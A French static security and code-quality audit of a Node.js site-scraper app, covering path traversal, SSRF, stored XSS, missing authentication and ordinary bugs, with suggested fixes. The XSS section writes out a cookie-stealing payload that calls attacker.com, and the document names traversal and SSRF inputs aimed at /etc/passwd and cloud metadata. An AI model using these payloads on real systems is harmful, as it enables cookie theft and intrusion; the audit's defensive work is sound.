# Audit de l'application Site Scraper
> Généré le 2026-05-29

---

## Vue d'ensemble

Application Node.js ESM composée de deux modes : **CLI** (`src/index.js`) et **serveur web** (`src/server.js`).
Elle crawle un site cible, extrait assets/design/contenu, génère un rapport Markdown et un mockup HTML éditable avec un éditeur de thème intégré.

**Stack :** Node.js (ESM), Playwright, Express, Cheerio, Axios, Chalk, Ora  
**Fichiers analysés :** 18 fichiers sources

---

## Sécurité

### 🔴 [CRITIQUE] Path traversal sur tous les endpoints `:domain`
**Fichier :** `src/server.js` — lignes 201, 211, 221, 233, 243, 299, 329, 369, 380

Les paramètres `domain`, `ref` et `client` sont concaténés directement dans des chemins de fichiers **sans aucune validation** :

```js
// Exemple ligne 201
const p = path.join(ROOT, 'output', req.params.domain, 'analysis', 'report.md');
```

Un domaine contenant `..` (ex: `../../etc/passwd`) permettrait de lire ou écraser des fichiers en dehors du répertoire `output/`. Toutes les routes suivantes sont vulnérables :

- `GET /api/report/:domain`
- `GET /api/report/:domain/download`
- `GET /api/audit-prompt/:domain`
- `POST /api/theme/:domain`
- `GET /api/theme/:domain`
- `GET /api/cross-theme/:domain`
- `POST /api/variants/:domain`
- `GET /api/variants/:domain`
- `GET /compare/:domain`
- `GET /api/sitemap/:domain`
- `POST /api/mockup` (via `domain` dans le body)

**Fix recommandé :**
```js
function safeDomain(domain) {
  if (!domain || typeof domain !== 'string') throw new Error('Domaine invalide');
  if (/[\/\\]/.test(domain) || domain.includes('..') || domain.startsWith('.')) {
    throw new Error('Domaine invalide');
  }
  return domain;
}

// Usage dans chaque route :
app.get('/api/report/:domain', async (req, res) => {
  try {
    const domain = safeDomain(req.params.domain);
    const p = path.join(ROOT, 'output', domain, 'analysis', 'report.md');
    // ...
  } catch {
    return res.status(400).json({ error: 'Domaine invalide' });
  }
});
```

---

### 🔴 [CRITIQUE] SSRF — POST `/api/scrape` sans validation d'URL
**Fichier :** `src/server.js` — ligne 50-57

```js
const { url, depth = 1 } = req.body;
if (!url) return res.status(400).json({ error: 'URL requise' });
const args = ['src/index.js', url, `--depth=${depth}`];
const child = spawn('node', args, { ... });
```

N'importe qui pouvant atteindre le port 3456 peut déclencher un scraping vers :
- `http://169.254.169.254/` (métadonnées cloud AWS/GCP/Azure)
- Des adresses réseau internes (`http://192.168.1.1/`)
- `file:///etc/passwd` (selon le comportement de Playwright)

Aucune authentification, aucun contrôle d'origine (CORS), aucune liste blanche.

**Fix recommandé :**
```js
function validateUrl(raw) {
  let u;
  try { u = new URL(raw); } catch { throw new Error('URL invalide'); }
  if (!['http:', 'https:'].includes(u.protocol)) throw new Error('Protocole non autorisé');

  // Bloquer les IP privées / link-local
  const host = u.hostname;
  if (/^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|::1|localhost)/i.test(host)) {
    throw new Error('Adresse interne non autorisée');
  }
  return u.href;
}
```

---

### 🔴 [CRITIQUE] XSS stocké dans les mockups générés
**Fichiers :** `src/mockup.js` (multiples fonctions), `src/modules/mockup-editor.js` (ligne 671-679)

Le contenu extrait du site cible (H1, H2, labels de formulaire, items de section, CTAs) est interpolé **directement** dans le HTML généré sans aucun échappement :

```js
// mockup.js — renderHero()
<h1>${title}</h1>
// title = page.headings?.h1?.[0] — provient du site scraped

// mockup-editor.js — buildSectionsList()
list.innerHTML = sectionsData.map(function(sec) {
  return '<span class="me-section-row__label">' + sec.label + '</span>' + ...
```

Un site malicieux avec `<h1><img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"></h1>` produira un mockup qui exécute du code arbitraire quand il est ouvert dans le navigateur.

**Fix recommandé :** Ajouter une fonction d'échappement HTML et l'appliquer à tous les contenus dynamiques :

```js
function esc(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Usage :
<h1>${esc(title)}</h1>
'<span class="me-section-row__label">' + esc(sec.label) + '</span>'
```

---

### 🟠 [HAUT] Profondeur de crawl non bornée
**Fichier :** `src/server.js` — ligne 51

```js
const { url, depth = 1 } = req.body;
const args = ['src/index.js', url, `--depth=${depth}`];
```

`depth` n'est ni validée ni plafonnée. Un `depth=999` déclencherait un crawl massif consommant toute la RAM, le CPU et la bande passante du serveur.

**Fix :** `const depth = Math.max(1, Math.min(parseInt(req.body.depth) || 1, 5));`

---

### 🟡 [MOYEN] Aucune authentification sur le serveur

Le serveur Express expose tous ses endpoints sans token, session ou vérification d'origine. Toute personne ayant accès au port 3456 peut :
- Déclencher des scrapes vers n'importe quelle URL
- Lire tous les rapports et données analysées
- Écraser les fichiers `theme.json`

**Fix minimal :** Ajouter un token statique via variable d'environnement :
```js
app.use((req, res, next) => {
  const token = process.env.API_TOKEN;
  if (token && req.headers['x-api-token'] !== token) {
    return res.status(401).json({ error: 'Non autorisé' });
  }
  next();
});
```

---

## Architecture / Bugs fonctionnels

### 🟠 [HAUT] Code Windows-spécifique cassé sur Linux/Mac
**Fichier :** `src/server.js` — lignes 17-33

```js
function getWindowsLocalAppData() {
  // ...
  const result = execSync('cmd /c echo %LOCALAPPDATA%', { encoding: 'utf8' }).trim();
  // ...
}
const PLAYWRIGHT_BROWSERS_PATH = path.win32.join(WINDOWS_LOCALAPPDATA, 'ms-playwright');
```

`path.win32.join` sur Linux produit un chemin avec backslashes (`C:\Users\...\ms-playwright`) que Playwright ne comprend pas.  
`execSync('cmd /c ...')` échoue silencieusement sur Linux/Mac et retourne une valeur incorrecte.  
Ce bloc s'exécute **inconditionnellement** au démarrage du serveur, sans guard `if (process.platform === 'win32')`.

**Fix :**
```js
let PLAYWRIGHT_BROWSERS_PATH;
if (process.platform === 'win32') {
  const localAppData = getWindowsLocalAppData();
  PLAYWRIGHT_BROWSERS_PATH = path.win32.join(localAppData, 'ms-playwright');
}
// Sur Linux/Mac, laisser Playwright trouver son chemin par défaut
```

---

### 🟠 [HAUT] Fuite mémoire — jobs Map non purgée
**Fichier :** `src/server.js` — ligne 41

```js
const jobs = new Map();
```

Les jobs terminés ne sont jamais supprimés de la Map. `job.lines` (tableau des logs) grossit sans limite pendant le scraping. Sur un serveur long-running avec de nombreux scrapes, c'est un OOM progressif.

**Fix :**
```js
// Après broadcast('done', ...)
setTimeout(() => jobs.delete(jobId), 30 * 60 * 1000); // purge après 30 min

// Limiter la taille du buffer de logs
if (job.lines.length > 1000) job.lines.shift(); // FIFO
```

---

### 🟡 [MOYEN] TAR artisanal fragile
**Fichier :** `src/modules/zip.js`

L'implémentation manuelle du format TAR dans `makeTarHeader` :
- **Tronque silencieusement** les noms de fichiers > 100 octets (corruption de header)
- Ne gère pas les extensions GNU TAR / POSIX pax pour les longs chemins
- Aucun test ni gestion d'erreur sur les cas limites

Pour un dossier `analysis/` avec des chemins longs (ex: nom de domaine long), des fichiers seront silencieusement corrompus dans l'archive.

**Fix :** Remplacer par une bibliothèque éprouvée :
```js
import archiver from 'archiver'; // npm install archiver
// ou
import { pack } from 'tar-stream'; // npm install tar-stream
```

---

### 🟡 [MOYEN] Attribution sémantique des couleurs naïve
**Fichier :** `src/modules/design.js` — ligne 103

```js
function buildSemanticColors(colors) {
  return colors.slice(0, SEMANTIC_NAMES.length).reduce((acc, hex, i) => {
    acc[SEMANTIC_NAMES[i]] = hex; // Nème couleur la plus fréquente → Nème nom sémantique
    return acc;
  }, {});
}
```

La couleur la plus fréquente du DOM est mappée en `primary`, la seconde en `secondary`, etc. En pratique, le blanc (`#FFFFFF`) est filtré mais une couleur grise très répandue (bordures, backgrounds de section) peut se retrouver en `primary`, rendant le design system généré incohérent.

**Amélioration possible :** Analyser la luminosité/saturation pour distinguer les couleurs d'accentuation des couleurs neutres.

---

### 🟢 [BAS] Race condition potentielle dans le crawl
**Fichier :** `src/modules/crawler.js` — ligne 18

La fonction `crawlPage` est récursive et ouvre une nouvelle `page` Playwright pour chaque URL. Pour un site avec de nombreux liens au même niveau de profondeur, la boucle `for…of` + `await` dans la récursion peut ouvrir de nombreuses pages concurrentes implicitement si des appels se chevauchent.

**Amélioration :** Utiliser un pool de concurrence (ex: `p-limit`) pour limiter le nombre de pages Playwright ouvertes simultanément.

---

## Qualité de code

### 🟡 [MOYEN] Placeholder hardcodé dans le contact
**Fichier :** `src/mockup.js` — ligne 654-656

```js
<li>📧 contact@example.com</li>
<li>📞 +32 00 000 00 00</li>
<li>📍 Adresse, Ville</li>
```

Ces valeurs factices apparaissent dans le mockup livré au client, même quand le site analysé dispose d'informations de contact réelles dans le contenu extrait.

**Fix :** Extraire les coordonnées depuis `page.footer` ou `page.sections.contact` avant de tomber sur le placeholder.

---

### 🟡 [MOYEN] Aucun test
Aucun fichier de test dans le projet. Les fonctions critiques comme `detectSections`, `buildSemanticColors`, `makeTarHeader` et `parseArgs` sont entièrement non couvertes.

**Recommandation :** Ajouter au minimum des tests unitaires pour :
- `src/utils/args.js` — parsing des arguments CLI
- `src/modules/sections.js` — détection des sections
- `src/modules/zip.js` — intégrité de l'archive

---

### 🟢 [BAS] Regex `hexOrKeep` ne gère pas les espaces dans `rgb()`
**Fichier :** `src/modules/mockup-editor.js` — ligne 1026

```js
var m = val.match(/rgba?\\((\\d+),(\\d+),(\\d+)/);
```

La regex ne gère pas `rgb(0, 0, 0)` (avec espaces après les virgules), format retourné par certains navigateurs. Résultat : ces couleurs sont converties en `#000000` au lieu de leur valeur réelle.

**Fix :** `/rgba?\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)/`

---

## Récapitulatif

| Priorité | Problème | Fichier | Effort |
|---|---|---|---|
| 🔴 Critique | Path traversal sur tous les endpoints `:domain` | `server.js` | ~1h |
| 🔴 Critique | SSRF via POST `/api/scrape` | `server.js` | ~30min |
| 🔴 Critique | XSS stocké dans les mockups | `mockup.js`, `mockup-editor.js` | ~2h |
| 🟠 Haut | Code Windows cassé sur Linux | `server.js` | ~30min |
| 🟠 Haut | Fuite mémoire jobs/lines | `server.js` | ~30min |
| 🟡 Moyen | Aucune authentification sur le serveur | `server.js` | ~1h |
| 🟡 Moyen | Profondeur de crawl non bornée | `server.js` | ~5min |
| 🟡 Moyen | TAR artisanal fragile | `zip.js` | ~1h |
| 🟡 Moyen | Attribution sémantique des couleurs naïve | `design.js` | ~2h |
| 🟡 Moyen | Aucun test | — | ~4h |
| 🟢 Bas | Placeholder hardcodé dans le contact | `mockup.js` | ~30min |
| 🟢 Bas | Regex `hexOrKeep` incomplète | `mockup-editor.js` | ~5min |

**Total effort estimé pour corriger les problèmes critiques et hauts : ~5h**

---

*Audit réalisé par analyse statique complète du code source.*
